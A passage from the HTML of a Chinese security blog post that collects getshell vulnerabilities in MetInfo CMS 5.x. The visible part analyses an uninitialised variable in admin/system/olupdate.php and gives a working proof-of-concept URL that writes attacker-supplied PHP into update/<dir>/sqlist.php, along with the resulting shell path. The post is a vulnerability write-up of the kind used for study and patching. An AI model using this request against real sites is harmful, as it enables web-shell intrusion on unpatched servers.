class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#/admin/system/olupdate.phpwen文件中，当$action=sql,$sql!=No Date且$sqlfile不是数组时进入如下过程</span><br><span class="line"></span><br><span class="line">#326-360行</span><br><span class="line">$num=1;</span><br><span class="line">$random = met_rand(6);</span><br><span class="line">$date=date(&apos;Ymd&apos;,time());</span><br><span class="line">require_once &apos;../system/database/global.func.php&apos;;</span><br><span class="line">do&#123;</span><br><span class="line">    $sqldump = &apos;&apos;;</span><br><span class="line">    $startrow = &apos;&apos;;</span><br><span class="line">    $tables=tableprearray($tablepre);</span><br><span class="line">    $sizelimit=2048;</span><br><span class="line">    $tableid = isset($tableid) ? $tableid - 1 : 0;</span><br><span class="line">    $startfrom = isset($startfrom) ? intval($startfrom) : 0;</span><br><span class="line">    $tablenumber = count($tables);</span><br><span class="line">    for($i = $tableid; $i &lt; $tablenumber &amp;&amp; strlen($sqldump) &lt; $sizelimit * 1000; $i++)&#123;</span><br><span class="line">        $sqldump .= sql_dumptable($tables[$i], $startfrom, strlen($sqldump));</span><br><span class="line">        $startfrom = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    $startfrom = $startrow;</span><br><span class="line">    $tableid = $i;</span><br><span class="line">    if(trim($sqldump))&#123;</span><br><span class="line">        $sqlfile[]=$bakfile = &quot;../update/$addr/&#123;$con_db_name&#125;_&#123;$date&#125;_&#123;$random&#125;_&#123;$num&#125;.sql&quot;;</span><br><span class="line">        $version=&apos;version:&apos;.$metcms_v;</span><br><span class="line">        $sqldump = &quot;#xxx.cn Created &#123;$version&#125; \n#&#123;$met_weburl&#125;\n#&#123;$tablepre&#125;\n#&#123;$met_webkeys&#125;\n# --------------------------------------------------------\n\n\n&quot;.$sqldump;</span><br><span class="line">        if(!file_put_contents($bakfile, $sqldump))&#123;</span><br><span class="line">            dl_error($lang_updaterr2.&quot;(&#123;$adminfile&#125;/update/$addr/&#123;$con_db_name&#125;_&#123;$date&#125;_&#123;$random&#125;_&#123;$num&#125;.sql)&quot;,$type,$olid,$ver,$addr,$action);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $num++;</span><br><span class="line">&#125;</span><br><span class="line">while(trim($sqldump));</span><br><span class="line">if(is_array($sqlfile)) $string = &quot;&lt;?php\n \$sqlfile = &quot;.var_export($sqlfile, true).&quot;; ?&gt;&quot;;</span><br><span class="line">filetest(&quot;../update/$addr/sqlist.php&quot;);</span><br><span class="line">if(!file_put_contents(&quot;../update/$addr/sqlist.php&quot;,$string))&#123;</span><br><span class="line">    dl_error($lang_updaterr2.&quot;(&#123;$adminfile&#125;/update/$addr/sqlist.php)&quot;,$type,$olid,$ver,$addr,$action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时由于sqlfile不是数组，即is_array($sqlfile)不成立，导致$string没有初始化，可以任意修改，接着调用file_put_contents将string的值写到/update/$addr/sqlist.php文件。</p>
+<p><em>PS:这里有一个小点,由于输入控制sqlfile不是数组，第345行执行$sqlfile[]=$bakfile = “../update/$addr/{$con_dbname}{$date}{$random}{$num}.sql”;会导致给字符串赋值报错，导致无法执行到后面的Getshell部分。所以需要构造payload使得trim($sqldump)为空，即$sqldump值为空，从而跳过$sqlfile[]赋值部分，这里构造tableid=1000(其实只要&gt;=44即可)</em></p>
+<p>最后的payload结构如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=shell内容&amp;addr=shell的目录&amp;tableid=1000</span><br></pre></td></tr></table></figure>
+<h3 id="2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控"><a href="#2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控" class="headerlink" title="2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)"></a>2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=&lt;?php phpinfo();?&gt;&amp;addr=12313&amp;tableid=1000</span><br></pre></td></tr></table></figure>
+<p>执行后的shell地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/admin/update/12313/sqlist.php</span><br></pre></td></tr></table></figure>
+<h2 id="0x05小结"><a href="#0x05小结" class="headerlink" title="0x05小结"></a>0x05小结</h2><p>都是需要后台管理员权限才能利用的漏洞，不过危害还是比较大，没有升级的网站赶紧升级6.0版本哦！<br>前几个都有一定的条件要求，后面两个比较通杀!</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01安装过程过滤不严导致Getshell"><span class="toc-number">2.</span> <span class="toc-text">0x01安装过程过滤不严导致Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-结合网上爆出的后台任意文件删除漏洞"><span class="toc-number">2.1.</span> <span class="toc-text">1. 结合网上爆出的后台任意文件删除漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-重装时数据库配置文件过滤不当"><span class="toc-number">2.2.</span> <span class="toc-text">2. 重装时数据库配置文件过滤不当</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-POC"><span class="toc-number">2.3.</span> <span class="toc-text">3. POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-CVE-2017-11347补丁绕过继续Getshell"><span class="toc-number">3.</span> <span class="toc-text">0x02 CVE-2017-11347补丁绕过继续Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-查找绝对路径的方法："><span class="toc-number">3.1.</span> <span class="toc-text">1. 查找绝对路径的方法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-漏洞分析"><span class="toc-number">3.2.</span> <span class="toc-text">2. 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-POC-注意左斜杠和右斜杠不能随意更改-："><span class="toc-number">3.3.</span> <span class="toc-text">3. POC(注意左斜杠和右斜杠不能随意更改)：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Copyindx函数处理不当Getshell"><span class="toc-number">4.</span> <span class="toc-text">0x03 Copyindx函数处理不当Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-声明"><span class="toc-number">4.1.</span> <span class="toc-text">1. 声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-漏洞点"><span class="toc-number">4.2.</span> <span class="toc-text">2. 漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-POC-xxx为任意的shell目录，index-php文件名不能修改"><span class="toc-number">4.3.</span> <span class="toc-text">3. POC(xxx为任意的shell目录，index.php文件名不能修改)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-olupdate文件缺陷导致Getshell"><span class="toc-number">5.</span> <span class="toc-text">0x04 olupdate文件缺陷导致Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-漏洞点"><span class="toc-number">5.1.</span> <span class="toc-text">1. 漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控"><span class="toc-number">5.2.</span> <span class="toc-text">2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05小结"><span class="toc-number">6.</span> <span class="toc-text">0x05小结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/MetinfoCMS/MetInfoCMS 5.X版本GETSHELL漏洞合集/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    JYP
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
